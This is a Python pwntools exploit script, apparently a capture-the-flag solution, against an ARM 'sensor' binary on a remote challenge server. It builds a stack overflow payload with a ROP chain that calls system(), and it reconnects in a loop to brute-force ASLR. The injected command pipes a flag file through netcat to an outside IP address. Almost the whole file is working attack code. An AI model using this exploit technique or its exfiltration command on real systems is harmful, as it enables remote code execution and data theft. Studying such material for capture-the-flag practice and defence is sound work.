#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

#gdb-multiarch -ex 'set architecture arm' -ex 'file processor_arm' -ex 'target remote localhost:1234' -ex 'b* extractAndMatchTraits' -ex 'c'


exe = context.binary = ELF(args.EXE or 'src/sensor_arm')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(['qemu-arm', exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
#b*0x5555555556fb
continue
'''.format(**locals())

def edit(idx, title, description):
    io.sendlineafter(b"choice:", b"3")
    io.sendlineafter(b":", idx)
    io.sendlineafter(b"report:", title)    
    io.sendlineafter(b"ghost:", description)


def create(title, conf):
    io.sendlineafter(b"choice:", b"1")
    io.sendlineafter(b":", title)
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", b"1")
    io.sendline(b"2")
    io.sendlineafter(b":", conf)
    io.sendlineafter(b":", b"wraith")

def switch_mode():
    io.sendlineafter(b"choice:", b"6")
    io.sendlineafter(b"(y/n):", b"y")

    
def analyze():
    io.sendlineafter(b"choice:", b"5")




i = 0
while True:
    print("Iteration: " + str(i))
    i += 1
    try:
        #io = remote("localhost", 1337)
        io = remote("phantom.chal.pwni.ng", 1337)
        switch_mode()
        create(b"11111111111111111111111", b"1")


        #ASLR10 0x76a76000, offset 32:
        SYSTEM_OFFSET = 0x47258
        SYSTEM  = 0x76abd258 #                                                            SYSTEM # 0x76eb0258 
        JMP1    = 0x76afca50 #['0x76afca50', 'pop {r4, pc}; ldr r0, [r0, #0x64]; bx lr;']   JMP2 # 0x76ee0824
        JMP2    = 0x76aed824 #['0x76aed824', 'add r0, sp, #0x10; blx r4;']                  JMP1 # 0x76ed3f0c
       
        '''
        set {int}0x7efffadc=0x76ed3f0c
        set {int}0x7efffae0=0x76ed3258
        set {int}0x7efffae4=0x76ee0824
        '''

        payload  = b"A"*136 # buffer
        payload += b"aaaa"  # r7
        payload += p32(JMP1)
        payload += p32(SYSTEM)
        payload += p32(JMP2)
        payload += b"B"*16
        payload += b"cat /flag | nc 167.71.33.163 1"
        

        edit(b"100", b"PPP", payload)
        analyze()

        io.close()
    except EOFError:
        io.close()
        continue

#helper to check it's exploitable
#for i in range {1..200}; do echo $i; ldd /processor_arm | grep 0x76a76000; done